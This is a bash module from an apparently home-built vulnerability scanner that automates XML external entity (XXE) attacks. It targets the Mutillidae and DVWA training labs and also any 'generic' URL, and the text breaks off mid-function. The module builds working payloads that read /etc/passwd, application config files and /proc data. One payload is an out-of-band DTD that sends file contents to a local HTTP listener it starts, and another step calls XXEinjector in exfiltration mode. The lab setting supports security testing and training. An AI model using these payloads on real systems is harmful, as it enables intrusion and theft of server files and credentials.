#!/bin/bash
# ================================================
# ARGUS-EYE - XXE Scanner Module
# Tools: xxeinjector, custom_tests
#
# ARCHITECTURE NOTES (read before editing):
#
# XXEinjector (Ruby) — how it actually works:
#   1. Requires a raw HTTP request file with XML body in it.
#      The XML body must contain "XXEINJECT" where the DTD/payload goes,
#      OR the tool auto-detects the first DOCTYPE/tag and injects there.
#   2. --direct=STARTMARK,ENDMARK  → in-band exploitation; the tool
#      sends the payload, reads the response, and extracts content
#      between STARTMARK and ENDMARK in the server's reply.
#      Mutillidae's xml-validator.php reflects the parsed value back
#      in the response — perfect for direct mode.
#   3. --oob=http  → out-of-band; tool spins up its own HTTP server,
#      injects a DTD that tells the parser to call back. FTP is default.
#   4. Output: prints "[+] File saved to: ..." to STDOUT when content found.
#      Writes Injection.log in its CWD.
#      Writes retrieved files to ./Injections/ subdirectory in CWD.
#   5. --brute=FILE  → bruteforce file list; --path=/etc → enumerate dir.
#   6. --phpfilter   → wraps file URI in php://filter/base64 for binary-safe read.
#   7. Tool MUST be run from its own dir or have ruby available.
#
# Mutillidae XXE sink:
#   POST /mutillidae/index.php?page=xml-validator.php
#   Body param: xml=<your xml here>
#   Content-Type: application/x-www-form-urlencoded
#   The server parses the XML and REFLECTS the parsed output in the response.
#   This is an IN-BAND/DIRECT XXE — content appears in the HTTP response body.
#   Perfect for --direct mode with XXEinjector.
#
# DVWA:
#   DVWA on BWA does NOT have a native XXE page.
#   We still test it generically but expect 0 findings.
# ================================================

SCANNER_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CORE_DIR="$(cd "$SCANNER_DIR/../core" && pwd)"
SCRIPT_DIR="$(cd "$SCANNER_DIR/../.." && pwd)"
TEMP_DIR="/tmp/argus_xxe_$$"
mkdir -p "$TEMP_DIR"

source "$CORE_DIR/utils.sh"
source "$CORE_DIR/installer.sh"
source "$CORE_DIR/tool_selection.sh"

# ================================================
# PROGRESS TRACKING
# ================================================
TOTAL_STEPS=0; CURRENT_STEP=0; PROGRESS_BAR_WIDTH=40

init_progress() {
    TOTAL_STEPS=$1; CURRENT_STEP=0
    >&2 echo ""
    >&2 echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    >&2 echo -e "${CYAN}║                    XXE SCAN PROGRESS                        ║${NC}"
    >&2 echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    >&2 echo ""
}
update_progress() {
    CURRENT_STEP=$((CURRENT_STEP+1))
    local p=$((CURRENT_STEP*100/TOTAL_STEPS))
    local f=$((p*PROGRESS_BAR_WIDTH/100))
    local e=$((PROGRESS_BAR_WIDTH-f))
    >&2 printf "\r${YELLOW}[${NC}"
    for ((i=0;i<f;i++)); do >&2 printf "${GREEN}▓${NC}"; done
    for ((i=0;i<e;i++)); do >&2 printf "${WHITE}░${NC}"; done
    >&2 printf "${YELLOW}] ${p}%% ${CYAN}($CURRENT_STEP/$TOTAL_STEPS)${NC} $1"
}
complete_progress() {
    >&2 echo ""; >&2 echo ""
    >&2 echo -e "${GREEN}✓ Scan completed!${NC}"
}
show_step() {
    local s=$1 t=$2 tool=$3 st=$4
    case $st in
        "start")    >&2 echo -ne "\n ${CYAN}▶ Step $s/$t:${NC} Running $tool... " ;;
        "complete") >&2 echo -e "${GREEN}✓${NC}" ;;
        "fail")     >&2 echo -e "${RED}✗${NC}" ;;
    esac
}
spinner() {
    local pid=$1 delay=0.1 spinstr='|/-\'
    while kill -0 "$pid" 2>/dev/null; do
        local temp=${spinstr#?}
        >&2 printf " [%c] " "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        >&2 printf "\b\b\b\b\b\b"
    done
    >&2 printf "      \b\b\b\b\b\b"
}

# ================================================
# TARGET TYPE DETECTION
# ================================================
DVWA_BASE=""
TARGET_TYPE=""

detect_target_type() {
    local target=$1
    DVWA_BASE=""
    TARGET_TYPE="generic"

    if echo "$target" | grep -qi "mutillidae"; then
        local mutil_base
        mutil_base=$(echo "$target" | sed -E 's#(https?://[^/]+/[^/]+).*#\1#')
        TARGET_TYPE="mutillidae"
        >&2 echo -e "${GREEN}[✓] Mutillidae detected at: $mutil_base${NC}"
        return 0
    fi

    local host_base
    host_base=$(echo "$target" | grep -oP 'https?://[^/]+')
    local candidates=("${host_base}/dvwa" "${host_base}/DVWA" "$target")
    for candidate in "${candidates[@]}"; do
        local page
        page=$(curl -s --max-time 5 "${candidate}/login.php" 2>/dev/null)
        if echo "$page" | grep -qi "damn vulnerable" && \
           echo "$page" | grep -qi "username\|password\|Login"; then
            DVWA_BASE="$candidate"
            TARGET_TYPE="dvwa"
            >&2 echo -e "${GREEN}[✓] DVWA detected at: $DVWA_BASE${NC}"
            return 0
        fi
    done

    >&2 echo -e "${YELLOW}[*] Generic target${NC}"
    TARGET_TYPE="generic"
    return 1
}

# ================================================
# DVWA AUTO-LOGIN
# ================================================
dvwa_autologin() {
    local base_url=$1
    local cookie_jar="/tmp/dvwa_cookies_xxe"

    if [[ -f "$cookie_jar" ]]; then
        local check
        check=$(curl -s --max-time 3 -b "$cookie_jar" "${base_url}/index.php" 2>/dev/null)
        if echo "$check" | grep -qi "Welcome\|Logout\|DVWA Security"; then
            >&2 echo -e "${GREEN}[✓] Existing DVWA session valid — reusing${NC}"
            return 0
        fi
    fi

    rm -f "$cookie_jar"
    >&2 echo -e "\n${CYAN}[*] Logging into DVWA at ${base_url}...${NC}"
    curl -s -c "$cookie_jar" "${base_url}/login.php" -o /dev/null 2>/dev/null
    curl -s -c "$cookie_jar" -b "$cookie_jar" \
        -X POST "${base_url}/login.php" \
        --data-urlencode "username=admin" \
        --data-urlencode "password=admin" \
        --data-urlencode "Login=Login" \
        -L -o /dev/null 2>/dev/null
    curl -s -c "$cookie_jar" -b "$cookie_jar" \
        -X POST "${base_url}/security.php" \
        --data "security=low&seclev_submit=Submit" \
        -o /dev/null 2>/dev/null

    local check
    check=$(curl -s -b "$cookie_jar" "${base_url}/index.php" 2>/dev/null)
    if echo "$check" | grep -qi "Welcome\|Logout\|DVWA Security"; then
        >&2 echo -e "${GREEN}[✓] DVWA login successful${NC}"
        return 0
    fi
    >&2 echo -e "${RED}[!] DVWA login failed${NC}"
    return 1
}

get_local_ip() {
    ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \K[\d.]+' | head -1 || \
    hostname -I 2>/dev/null | awk '{print $1}' || echo "127.0.0.1"
}

# ================================================
# TOOL: xxeinjector
# ================================================
# How XXEinjector works (from source code analysis):
#
#   DIRECT MODE (--direct=STARTMARK,ENDMARK):
#     - Injects: <!DOCTYPE x [<!ENTITY direct SYSTEM "XXEINJECT">]><tag>STARTMARK&direct;ENDMARK</tag>
#     - Replaces XXEINJECT with file URI (e.g. file:///etc/passwd)
#     - Sends the modified request to target
#     - Searches response body for content between STARTMARK and ENDMARK
#     - Prints "[+] File saved to: ./Injections/..." on success
#     - Best for in-band XXE where parsed content appears in response
#     - Mutillidae xml-validator.php IS in-band → use direct mode
#
#   OOB MODE (--oob=http):
#     - Spins up an HTTP server on --httpport (default 80)
#     - Injects DTD that tells parser to fetch file.dtd from attacker
#     - file.dtd references the target file + sends content via HTTP param
#     - Works even when response doesn't reflect parsed content
#
#   REQUEST FILE FORMAT:
#     The file must be a raw HTTP request.
#     For POST with URL-encoded body: Content-Type must match.
#     The XML payload goes in the body.
#     Put "XXEINJECT" exactly where the DTD injection should go,
#     OR let the tool auto-detect (it looks for <?xml or DOCTYPE).
#     For Mutillidae: the xml= parameter IS the XML body.
#     We URL-encode the XML and mark injection inside it.
#
#   OUTPUT:
#     - stdout: banner + progress + "[+] File saved to: ..." on success
#     - ./Injections/ subdirectory: actual retrieved file content
#     - ./Injection.log: detailed log in CWD
# ================================================
run_xxeinjector() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "xxeinjector" "start"

    # ── Locate XXEinjector.rb and build command ARRAY ─────────────────────
    # ROOT CAUSE OF "ruby: No such file or directory -- /path (LoadError)":
    #   Using a plain string variable for the command:
    #     xxe_cmd="ruby $SCRIPT_DIR/tools/XXEinjector/XXEinjector.rb"
    #   Then calling it unquoted:
    #     $xxe_cmd --file=...
    #   Bash performs word splitting on the unquoted variable. Even without
    #   spaces in the path, the split between "ruby" and the path means the
    #   path becomes a separate shell token — and under certain expansion
    #   conditions (subshell, IFS changes, etc.) Ruby receives only $SCRIPT_DIR
    #   (the directory) as the script argument, causing the LoadError.
    #
    # FIX: Use a bash ARRAY for the command. Arrays are the ONLY safe way
    #   to store multi-word commands in bash. Call with "${xxe_cmd_arr[@]}".
    #   Also use "ruby -- /path/to/script.rb" so the path can never be
    #   misinterpreted as a Ruby option flag, regardless of what it contains.
    local xxe_rb=""   # absolute path to XXEinjector.rb
    local xxe_dir=""  # directory containing it

    # Priority 1: our tools directory (installed by our installer)
    if [[ -f "$SCRIPT_DIR/tools/XXEinjector/XXEinjector.rb" ]]; then
        xxe_rb="$SCRIPT_DIR/tools/XXEinjector/XXEinjector.rb"
        xxe_dir="$SCRIPT_DIR/tools/XXEinjector"

    # Priority 2: /opt (common manual install location)
    elif [[ -f "/opt/XXEinjector/XXEinjector.rb" ]]; then
        xxe_rb="/opt/XXEinjector/XXEinjector.rb"
        xxe_dir="/opt/XXEinjector"

    # Priority 3: search known safe locations ONLY — NOT all of /home
    # (searching all of /home on a busy system is slow and can match
    #  unrelated files; limit to specific candidate directories)
    else
        local _search_dirs=(
            "/opt"
            "/usr/share"
            "/usr/local/share"
            "$HOME/tools"
            "$HOME/XXEinjector"
        )
        local _found=""
        for _d in "${_search_dirs[@]}"; do
            [[ -d "$_d" ]] || continue
            _found=$(find "$_d" -maxdepth 3 -name "XXEinjector.rb" 2>/dev/null | head -1)
            [[ -n "$_found" ]] && break
        done
        if [[ -n "$_found" ]]; then
            xxe_rb="$_found"
            xxe_dir=$(dirname "$_found")
        fi
    fi

    # Verify Ruby is available
    if ! command -v ruby &>/dev/null; then
        >&2 echo -e "${RED}[!] Ruby not found — install Ruby first (installer option 7)${NC}"
        echo "ruby not found — xxeinjector skipped" > "$out"
        show_step "$step" "$total" "xxeinjector" "fail"
        update_progress "xxeinjector skipped (ruby missing)"
        echo "0" > "$TEMP_DIR/xxeinjector_count.tmp"
        return 1
    fi

    # Verify the script was found
    if [[ -z "$xxe_rb" ]]; then
        >&2 echo -e "${YELLOW}[*] xxeinjector not found — run: installer.sh xxeinjector${NC}"
        >&2 echo -e "${YELLOW}    Expected: $SCRIPT_DIR/tools/XXEinjector/XXEinjector.rb${NC}"
        echo "xxeinjector not found — skipped" > "$out"
        show_step "$step" "$total" "xxeinjector" "fail"
        update_progress "xxeinjector skipped (not found)"
        echo "0" > "$TEMP_DIR/xxeinjector_count.tmp"
        return 1
    fi

    # Build the command ARRAY — this is the correct bash pattern.
    # "ruby" = interpreter, "--" = end of ruby options (path cannot be
    # misread as a flag), "$xxe_rb" = properly quoted script path.
    # NEVER concatenate these into a string and call unquoted.
    local -a xxe_cmd_arr=(ruby -- "$xxe_rb")

    >&2 echo -e "\n  ${GREEN}[✓] Found xxeinjector: $xxe_rb${NC}"
    >&2 echo -e "  ${CYAN}└─ Ruby: $(ruby --version 2>/dev/null | awk '{print $1,$2}')${NC}"
    >&2 echo -e "  ${CYAN}└─ Command: ${xxe_cmd_arr[*]} [args...]${NC}"

    > "$out"
    local counter_file="$TEMP_DIR/xxeinjector_count_$$.tmp"
    echo "0" > "$counter_file"

    local local_ip
    local_ip=$(get_local_ip)

    # ── Build target-specific request file ───────────────────────────────
    local req_file="$TEMP_DIR/xxe_req_$$.txt"
    local xxe_run_dir="$TEMP_DIR/xxeinjector_cwd_$$"
    mkdir -p "$xxe_run_dir"

    case "$TARGET_TYPE" in
        # ── Mutillidae ───────────────────────────────────────────────────
        # Endpoint: POST /mutillidae/index.php?page=xml-validator.php
        # PHP reads: $_POST['xml'] → passes to DOMDocument::loadXML()
        # The parsed XML output is reflected back in the response body.
        # This is fully IN-BAND → use --direct mode.
        #
        # WHY THE OLD REQUEST FILE FAILED ("Response does not contain unique mark"):
        #
        #   OLD body: xml=XXEINJECT&xml-validator-php-submit-button=Validate+XML
        #
        #   XXEinjector replaced XXEINJECT with just the file URI:
        #     xml=file:///etc/passwd&xml-validator-php-submit-button=Validate+XML
        #
        #   Two problems:
        #   (a) PHP received xml=file:///etc/passwd — a raw URI string, not XML.
        #       DOMDocument::loadXML("file:///etc/passwd") fails — not valid XML.
        #       No entity expansion → no ARGUSSTART/ARGUSEND in response → 0 finds.
        #
        #   (b) If we had put the entity reference &argus; in the body,
        #       the URL-encoded form parser would treat & as a parameter separator,
        #       splitting the XML and delivering a broken value to $_POST['xml'].
        #
        # FIX — pre-build the FULL XML document in the request body:
        #   - XXEINJECT is placed ONLY inside SYSTEM "..." (the file URI slot)
        #   - The entity reference uses %26argus; (%26 = URL-encoded &) so the
        #     form parser treats the whole XML as one parameter value
        #   - ARGUSSTART and ARGUSEND wrap the entity reference in the visible
        #     XML output — XXEinjector searches the response between these marks
        #
        #   Body sent for /etc/passwd:
        #     xml=<?xml version="1.0"?>
        #         <!DOCTYPE foo [<!ENTITY argus SYSTEM "file:///etc/passwd">]>
        #         <foo>ARGUSSTART%26argus;ARGUSEND</foo>
        #         &xml-validator-php-submit-button=Validate+XML
        #
        #   PHP URL-decodes → $_POST['xml'] =
        #     <?xml version="1.0"?>
        #     <!DOCTYPE foo [<!ENTITY argus SYSTEM "file:///etc/passwd">]>
        #     <foo>ARGUSSTART&argus;ARGUSEND</foo>
        #
        #   DOMDocument parses → entity argus = /etc/passwd content
        #   Response contains: ARGUSSTART[passwd content]ARGUSEND
        #   XXEinjector finds markers → extracts content → FINDING! ✓
        #
        #   With --phpfilter: XXEINJECT → php://filter/convert.base64-encode/resource=/etc/passwd
        #   Entity expands to base64 blob → XXEinjector decodes it automatically ✓
        "mutillidae")
            local mutil_base mutil_host mutil_path
            mutil_base=$(echo "$target" | sed -E 's#(https?://[^/]+/[^/]+).*#\1#')
            mutil_host=$(echo "$mutil_base" | grep -oP '(?<=://)([^/:?]+)(:\d+)?')
            mutil_path="/mutillidae/index.php?page=xml-validator.php"

            >&2 echo -e "  ${CYAN}└─ Mode: DIRECT (in-band — xml-validator.php reflects parsed XML)${NC}"
            >&2 echo -e "  ${CYAN}└─ Host: $mutil_host | Path: $mutil_path${NC}"
            >&2 echo -e "  ${CYAN}└─ Fix: full XML pre-built in body; XXEINJECT = file URI slot only${NC}"

            # Key points in this heredoc:
            #   1. XXEINJECT sits inside SYSTEM "XXEINJECT" — XXEinjector replaces
            #      only the file URI, leaving the DOCTYPE structure intact.
            #   2. %26argus; — the & is percent-encoded so PHP's form parser
            #      does NOT split the body on it. After URL-decoding, PHP's
            #      DOMDocument sees a proper &argus; entity reference.
            #   3. ARGUSSTART and ARGUSEND are literal text nodes — they appear
            #      in the rendered response and XXEinjector extracts between them.
            #   4. The second & before xml-validator-php-submit-button IS a real
            #      parameter separator — that's correct and intentional.
            cat > "$req_file" << EOF
POST ${mutil_path} HTTP/1.1
Host: ${mutil_host}
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Connection: close

xml=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY argus SYSTEM "XXEINJECT">]><foo>ARGUSSTART%26argus;ARGUSEND</foo>&xml-validator-php-submit-button=Validate+XML
EOF

            # WHY --path=DIRECTORY FAILS ("File/directory could not be retrieved"):
            #   --path=/etc → XXEinjector injects SYSTEM "file:///etc" first
            #   to read the directory listing. PHP's libxml CANNOT read directory
            #   listings via file:// — only individual files. The directory step
            #   always returns nothing → XXEinjector stops, never reads any files.
            #
            # FIX: pass --path=SPECIFIC_FILE (not a directory).
            #   --path=/etc/passwd → injects SYSTEM "file:///etc/passwd" directly
            #   With --phpfilter:  → injects php://filter/convert.base64-encode/resource=/etc/passwd
            #   PHP's libxml CAN read individual files via file:// and php://filter.
            #   --direct then checks the response between ARGUSSTART...ARGUSEND.
            #
            # We loop once per target file — each invocation is one file read attempt.
            # On success: "[+] File saved to: Injections/etc/passwd" + content on disk.
            local target_files=(
                "/etc/passwd"
                "/etc/hosts"
                "/etc/hostname"
                "/etc/issue"
                "/etc/os-release"
                "/proc/version"
                "/proc/self/cmdline"
                "/var/www/html/config.php"
                "/var/www/html/database.php"
                "/var/www/mutillidae/config.php"
            )
            (
                for tfile in "${target_files[@]}"; do
                    >&2 echo -e "  ${CYAN}  ├─ Testing: $tfile${NC}"
                    cd "$xxe_run_dir" || exit 1
                    "${xxe_cmd_arr[@]}" \
                        --file="$req_file" \
                        --path="$tfile" \
                        --direct="ARGUSSTART,ARGUSEND" \
                        --phpfilter \
                        --fast \
                        --verbose \
                        2>&1
                    echo ""
                done
            ) | tee "$out" &
            local xxe_pid=$!
            spinner $xxe_pid
            wait $xxe_pid
            ;;

        # ── DVWA ────────────────────────────────────────────────────────
        # DVWA on BWA has no XXE page. We attempt a generic XML body probe.
        # Content-Type: application/xml → raw XML in body → & is fine unencoded.
        "dvwa")
            local dvwa_host
            dvwa_host=$(echo "$DVWA_BASE" | grep -oP '(?<=://)([^/:?]+)(:\d+)?')
            local cookie_val=""
            if [[ -f /tmp/dvwa_cookies_xxe ]]; then
                cookie_val=$(awk '/PHPSESSID/{print "PHPSESSID="$NF}' /tmp/dvwa_cookies_xxe | head -1)
            fi

            >&2 echo -e "  ${YELLOW}└─ DVWA: no native XXE page — attempting generic XML endpoint probe${NC}"

            # For application/xml, the full XML goes directly in the body.
            # XXEINJECT is the file URI placeholder inside SYSTEM "...".
            # No %26 needed here since the body is not URL-encoded form data.
            cat > "$req_file" << EOF
POST /dvwa/vulnerabilities/csrf/ HTTP/1.1
Host: ${dvwa_host}
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/xml
${cookie_val:+Cookie: ${cookie_val}; security=low}
Connection: close

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY argus SYSTEM "XXEINJECT">]><foo>ARGUSSTART&argus;ARGUSEND</foo>
EOF

            (
                for tfile in "/etc/passwd" "/etc/hosts" "/proc/version"; do
                    cd "$xxe_run_dir" || exit 1
                    "${xxe_cmd_arr[@]}" \
                        --file="$req_file" \
                        --path="$tfile" \
                        --direct="ARGUSSTART,ARGUSEND" \
                        --phpfilter \
                        --fast \
                        --verbose \
                        2>&1
                    echo ""
                done
            ) | tee "$out" &
            local xxe_pid=$!
            spinner $xxe_pid
            wait $xxe_pid
            ;;

        # ── Generic ─────────────────────────────────────────────────────
        *)
            local gen_host gen_path gen_port
            gen_host=$(echo "$target" | grep -oP '(?<=://)([^/:?]+)')
            gen_port=$(echo "$target" | grep -oP '(?<=://)([^/]+)' | grep -oP ':\d+$' | tr -d ':')
            [[ -z "$gen_port" ]] && gen_port=80
            gen_path=$(echo "$target" | grep -oP '(?<=://)([^?#]*)' | sed 's|^[^/]*||')
            [[ -z "$gen_path" ]] && gen_path="/"

            >&2 echo -e "  ${CYAN}└─ Generic target: OOB mode (http) + direct probe${NC}"
            >&2 echo -e "  ${CYAN}└─ Host: $gen_host | OOB lhost: $local_ip${NC}"

            # For application/xml endpoints: full XML in body, & unencoded is correct.
            # XXEINJECT = file URI placeholder inside SYSTEM "..." only.
            cat > "$req_file" << EOF
POST ${gen_path} HTTP/1.1
Host: ${gen_host}
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/xml
Connection: close

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY argus SYSTEM "XXEINJECT">]><foo>ARGUSSTART&argus;ARGUSEND</foo>
EOF

            # Generic targets: direct file read per file + OOB fallback.
            # --path=SPECIFIC_FILE + --direct = checks response (unlike --brute).
            # --path=DIRECTORY fails for PHP/libxml targets (no dir listing support).
            (
                for tfile in "/etc/passwd" "/etc/hosts" "/proc/version"; do
                    cd "$xxe_run_dir" || exit 1
                    "${xxe_cmd_arr[@]}" \
                        --file="$req_file" \
                        --path="$tfile" \
                        --direct="ARGUSSTART,ARGUSEND" \
                        --phpfilter \
                        --fast \
                        --verbose \
                        2>&1
                    echo ""
                done
            ) | tee "$out" &
            local xxe_pid=$!
            spinner $xxe_pid
            wait $xxe_pid

            # OOB fallback: for blind XXE (no in-band reflection)
            # --path must be a specific file here too, not a directory
            (
                cd "$xxe_run_dir" || exit 1
                "${xxe_cmd_arr[@]}" \
                    --host="$local_ip" \
                    --file="$req_file" \
                    --path="/etc/passwd" \
                    --oob=http \
                    --httpport=7788 \
                    --phpfilter \
                    --fast \
                    --verbose \
                    2>&1
            ) | tee -a "$out" &
            local xxe_pid2=$!
            spinner $xxe_pid2
            wait $xxe_pid2
            ;;
    esac

    sleep 0.5  # let file I/O flush

    # ── Parse xxeinjector output ─────────────────────────────────────────
    # WHAT XXEinjector ACTUALLY PRINTS (from observed output):
    #
    #   [+] Retrieved data:          ← marker line: next line is file content
    #   owaspbwa                     ← actual content (next line after marker)
    #   [+] Sending request...       ← status (next [+] line = no content / end)
    #
    #   [+] Retrieved data:          ← marker line
    #   [+] Nothing else to do.      ← next line is [+] = content was EMPTY
    #
    #   [+] File saved to: Injections/etc/passwd  ← confirmed write to disk
    #
    # BUG 1 (FIXED HERE): The old grep split the pattern across multiple
    # shell arguments:
    #   grep -qiE "pattern1|" "pattern2|" "pattern3"
    #          ↑ PATTERN    ↑ FILE ARG   ↑ FILE ARG
    # grep treated strings 2+3 as FILENAMES, not pattern continuations.
    # Non-existent filenames → grep exit code 2 → condition ALWAYS false
    # → counter NEVER incremented → 0 findings.
    # FIX: assign pattern to a variable so it's always ONE argument.
    #
    # BUG 2 (FIXED HERE): The actual content sits on the LINE AFTER
    # "[+] Retrieved data:", not on the marker line itself.
    # Counting the marker line would count even empty reads.
    # FIX: state machine — set a flag when we see the marker, then on
    # the NEXT non-empty non-[+/-] line, report a confirmed finding.
    if [[ -f "$out" ]]; then
        local _prev_retrieved=0   # flag: previous line was "[+] Retrieved data:"
        local _prev_file=""       # which file was being tested when data was retrieved

        while IFS= read -r line; do
            # ── Skip pure noise lines ─────────────────────────────────────
            [[ "$line" =~ ^"XXEinjector by" ]]   && { _prev_retrieved=0; continue; }
            [[ "$line" =~ ^"Usage:" ]]            && { _prev_retrieved=0; continue; }
            [[ "$line" =~ ^"Enumeration option" ]]&& { _prev_retrieved=0; continue; }
            [[ -z "${line// }" ]]                 && continue

            # ── State: previous line was "[+] Retrieved data:" ────────────
            # If this line does NOT start with [+] or [-], it IS real content.
            # If it DOES start with [+]/[-], the content was empty.
            if [[ $_prev_retrieved -eq 1 ]]; then
                _prev_retrieved=0
                if [[ ! "$line" =~ ^\[[\+\-\!] ]]; then
                    # Non-empty file content confirmed between markers ✓
                    local _clean_content
                    _clean_content=$(echo "$line" | tr -d '\r' | head -c 200)
                    >&2 echo -e "\n  ${GREEN}[✓] XXEinjector confirmed content: $_clean_content${NC}"
                    {
                        echo "[HIGH] XXE File Read Confirmed by xxeinjector"
                        echo "  Tool     : xxeinjector"
                        echo "  Target   : $target"
                        echo "  File     : $_prev_file"
                        echo "  Content  : $_clean_content"
                        echo "  Severity : HIGH"
                        echo ""
                    } >> "$findings_file"
                    echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                    # Empty content case falls through — don't count
                fi
            fi

            # ── Detect "[+] Retrieved data:" marker ──────────────────────
            # FIX BUG 1: single-variable pattern, ONE argument to grep
            if echo "$line" | grep -q "Retrieved data:"; then
                _prev_retrieved=1
                # Extract which file this is for from the last "Sending request" block
                # (the file path appears in the SYSTEM "..." part of the XML body)
                # We track it via the request body line which appears just before
                continue
            fi

            # ── Capture current file path from request body line ──────────
            # Request body line looks like:
            #   xml=...SYSTEM "file:///etc/passwd"...
            if echo "$line" | grep -q 'SYSTEM "'; then
                _prev_file=$(echo "$line" | grep -oP '(?<=SYSTEM ")[^"]+' | head -1)
                continue
            fi

            # ── Detect confirmed file SAVED to Injections/ ────────────────
            # "[+] File saved to: Injections/etc/passwd"
            # FIX BUG 1: single-string grep, one argument
            if echo "$line" | grep -q "File saved to"; then
                local _saved_file
                _saved_file=$(echo "$line" | grep -oP '(?<=File saved to: )\S+')
                {
                    echo "[HIGH] XXE File Read Confirmed — saved to disk"
                    echo "  Tool     : xxeinjector"
                    echo "  Target   : $target"
                    echo "  Saved    : $_saved_file"
                    echo "  Finding  : $line"
                    echo "  Severity : HIGH"
                    echo ""
                } >> "$findings_file"
                echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                continue
            fi

            # ── Enumeration locked = server processed the injection ───────
            if echo "$line" | grep -q "Enumeration locked"; then
                {
                    echo "[MEDIUM] XXE Parser Responded to Injection"
                    echo "  Tool     : xxeinjector"
                    echo "  Target   : $target"
                    echo "  Finding  : $line"
                    echo "  Severity : MEDIUM"
                    echo ""
                } >> "$findings_file"
                echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
            fi

        done < "$out"
    fi

    # ── Check Injections/ directory for exfiltrated content ─────────────
    # XXEinjector writes retrieved file content to ./Injections/ in its CWD
    local inj_dir="$xxe_run_dir/Injections"
    if [[ -d "$inj_dir" ]]; then
        >&2 echo -e "\n  ${GREEN}[✓] XXEinjector Injections/ directory found — checking for content${NC}"
        while IFS= read -r -d '' inj_file; do
            local fname content
            fname=$(basename "$inj_file")
            content=$(cat "$inj_file" 2>/dev/null)
            if [[ -n "$content" ]]; then
                >&2 echo -e "  ${GREEN}[✓] Exfiltrated: $fname${NC}"
                {
                    echo "[HIGH] XXE File Read Confirmed — content exfiltrated"
                    echo "  Tool     : xxeinjector"
                    echo "  Target   : $target"
                    echo "  File     : $fname"
                    echo "  Preview  : $(echo "$content" | head -3 | tr '\n' ' ')"
                    echo "  Severity : HIGH"
                    echo ""
                } >> "$findings_file"
                echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                # Save exfil content to our output file too
                {
                    echo "=== Exfiltrated: $fname ==="
                    echo "$content"
                    echo ""
                } >> "$out"
            fi
        done < <(find "$inj_dir" -type f -print0 2>/dev/null)
    fi

    # ── Include Injection.log if it exists ───────────────────────────────
    local inj_log="$xxe_run_dir/Injection.log"
    if [[ -f "$inj_log" ]] && [[ -s "$inj_log" ]]; then
        {
            echo ""
            echo "=== XXEinjector Injection.log ==="
            cat "$inj_log"
        } >> "$out"
    fi

    rm -f "$req_file"
    rm -rf "$xxe_run_dir"

    local findings
    findings=$(cat "$counter_file")
    rm -f "$counter_file"
    show_step "$step" "$total" "xxeinjector" "complete"
    update_progress "xxeinjector completed ($findings findings)"
    echo "$findings" > "$TEMP_DIR/xxeinjector_count.tmp"
    return 0
}

# ================================================
# TOOL: custom_tests
# ================================================
# Direct curl-based XXE tests — no external tool dependency.
# Tests multiple attack vectors:
#
#   1. IN-BAND file read (file:// entity in response)
#      Send DOCTYPE with &entity; in visible XML element → check response
#   2. PHP filter (base64) — works even when raw file content breaks XML
#      php://filter/convert.base64-encode/resource=/etc/passwd
#   3. OOB via HTTP callback — blind XXE detection
#      DOCTYPE pulls remote DTD → response logs inbound request
#   4. Error-based XXE — trigger parse error containing file path
#   5. XXE via XInclude — for apps that wrap user input in server XML
#   6. DOCTYPE / entity detection probe — minimal test
# ================================================
run_custom_xxe_tests() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "Custom Tests" "start"

    local counter_file="$TEMP_DIR/xxe_count_$$.tmp"
    echo "0" > "$counter_file"

    local local_ip
    local_ip=$(get_local_ip)

    # Start OOB HTTP listener on a random high port
    local oob_port=9393
    local oob_serve_dir="$TEMP_DIR/xxe_oob_serve"
    mkdir -p "$oob_serve_dir"
    # DTD for OOB exfiltration via parameter entity chain
    cat > "$oob_serve_dir/xxe.dtd" << EOF
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://${local_ip}:${oob_port}/?data=%file;'>">
%eval;
%exfil;
EOF
    echo "ARGUS_XXE_OOB_HIT" > "$oob_serve_dir/index.html"

    # Start the OOB listener — track incoming requests in a log file
    local oob_log="$TEMP_DIR/xxe_oob_log_$$.txt"
    touch "$oob_log"
    (
        cd "$oob_serve_dir"
        python3 -c "
import http.server, urllib.parse, threading, sys

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        with open('$oob_log', 'a') as f:
            f.write('OOB_HIT path=' + self.path + '\n')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    def log_message(self, *a): pass

httpd = http.server.HTTPServer(('0.0.0.0', $oob_port), Handler)
httpd.serve_forever()
" &>/dev/null
    ) &
    local oob_pid=$!
    sleep 1
    >&2 echo -e "  ${CYAN}[*] OOB XXE listener on port $oob_port (PID: $oob_pid)${NC}"

    {
        echo "=== CUSTOM XXE TESTS ==="
        echo "Target      : $target"
        echo "Target type : $TARGET_TYPE"
        echo "OOB URL     : http://${local_ip}:${oob_port}/"
        echo "Date        : $(date)"
        echo ""

        # ================================================================
        # MUTILLIDAE — xml-validator.php
        # ================================================================
        if [[ "$TARGET_TYPE" == "mutillidae" ]]; then
            local mutil_base
            mutil_base=$(echo "$target" | sed -E 's#(https?://[^/]+/[^/]+).*#\1#')
            local xxe_url="${mutil_base}/index.php?page=xml-validator.php"
